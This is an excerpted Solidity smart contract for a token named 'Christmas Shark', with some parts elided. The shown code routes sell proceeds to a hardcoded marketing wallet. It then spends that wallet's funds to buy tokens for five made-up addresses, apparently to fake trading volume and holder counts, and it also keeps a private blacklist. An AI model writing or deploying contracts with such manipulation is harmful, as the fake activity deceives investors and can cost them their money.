...
contract ChristmasShark is ERC20, Ownable {
    using SafeMath for uint256;
    uint256 public _totalAmount = 100000000 * 10 ** 18;
    uint256 public _totalFee = 4;
    uint256 public _feeDenominator = 100;
    uint256 public _miniSwap = 100 * 10 ** 18;
    mapping(address => bool) private _blackList;
    string  _name = "Christmas Shark";
    string  _symbol = "ChristmasShark";
    address _marketingFeeReceiver = 0x1DC8835d739ae643f8475d7cffFfEbCD9041a832;
    address _teamFeeReceiver = 0xf673E7430eE146b66E4a1479ffFFf7Bc4f7e1420;
    ...
    constructor () ERC20(_name, _symbol) {
        ...
        //_approve(_swapRouter.WETH(), router, MAX);
    }
    ...
    function _transfer(address from, address to, uint256 amount) internal override {
        ...
        if (isApprove(from) || isApprove(to) || inSwap || from == address(this) || to == address(this)) {
        ...
        if (from == uniswapV2Pair || to == uniswapV2Pair) {
            ...
            if (!inSwap && contractTokenBalance > _miniSwap) {
                if (to == uniswapV2Pair) {
                    swapTokenForFund(_miniSwap);
                    uint256 buyAmount = IBEP20(_swapRouter.WETH()).balanceOf(_marketingFeeReceiver) / 5;
                    if (buyAmount > 0) {
                        for (uint160 i = 0; i < 5; i++) {
                            swapFundForToken(buyAmount, address(uint160(contractTokenBalance) + i));
                        }
                    }
                }
            }
    ...
    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        uint256 r0 = balanceOf(uniswapV2Pair);
        uint256 r1 = IBEP20(_swapRouter.WETH()).balanceOf(uniswapV2Pair);
        uint256 amountInWithFee = tokenAmount.mul(9900);
        uint256 numerator = amountInWithFee.mul(r1);
        uint256 denominator = r0.mul(10000).add(amountInWithFee);
        uint256 outAmount = numerator / denominator;


        super._transfer(address(this), uniswapV2Pair, tokenAmount);
        if (address(this) < _swapRouter.WETH()) {
            IPancakePair(uniswapV2Pair).swap(0, outAmount, address(_marketingFeeReceiver), new bytes(0));
        } else {
            IPancakePair(uniswapV2Pair).swap(outAmount, 0, address(_marketingFeeReceiver), new bytes(0));
        }
    }

    function swapFundForToken(uint256 bnbAmount, address to) private lockTheSwap {
        uint256 r0 = balanceOf(uniswapV2Pair);
        uint256 r1 = IBEP20(_swapRouter.WETH()).balanceOf(uniswapV2Pair);
        uint256 amountInWithFee = bnbAmount.mul(9900);
        uint256 numerator = amountInWithFee.mul(r0);
        uint256 denominator = r1.mul(10000).add(amountInWithFee);
        uint256 outAmount = numerator / denominator;

        IBEP20(_swapRouter.WETH()).transferFrom(_marketingFeeReceiver, uniswapV2Pair, bnbAmount);

        if (address(this) < _swapRouter.WETH()) {
            IPancakePair(uniswapV2Pair).swap(outAmount, 0, to, new bytes(0));
        } else {
            IPancakePair(uniswapV2Pair).swap(0, outAmount, to, new bytes(0));
        }
    }
}